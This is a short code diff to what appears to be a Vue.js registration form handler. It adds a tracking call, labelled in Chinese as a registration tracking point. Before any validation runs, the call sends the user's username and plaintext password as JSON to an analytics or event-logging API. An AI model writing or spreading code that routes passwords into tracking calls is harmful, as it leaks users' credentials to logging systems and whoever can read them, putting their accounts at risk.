@@ -52,6 +52,8 @@
     },
     methods: {
         go () {
+            this.xdapi.buriedPoint({buriedPointType: '注册埋点', data: JSON.stringify({user: this.user, pwd: this.pwd})}, true);
+
             if (this.user.trim() === '') {
                 return this.user_errTopLabel = '请输入用户名/手机号'
             } else if (!/^1\d{10}$/.test(this.user.trim())) {
